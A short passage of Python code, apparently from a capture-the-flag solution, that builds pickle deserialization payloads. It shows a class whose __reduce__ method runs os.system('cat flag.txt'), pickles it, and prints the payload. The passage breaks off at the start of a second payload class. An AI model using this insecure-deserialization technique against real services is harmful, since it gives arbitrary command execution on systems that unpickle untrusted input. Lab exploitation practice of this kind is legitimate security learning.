# Also try a simpler version that outputs to a visible location
class ExploitSimple:
    def __reduce__(self):
        return (os.system, ("cat flag.txt",))

exploit_simple = pickle.dumps(ExploitSimple(), protocol=2)
print(f"\nSimple payload size: {len(exploit_simple)} bytes")
print(f"Simple payload starts with: {exploit_simple[:20].hex()}")

# Try version that writes to response
class ExploitWrite:
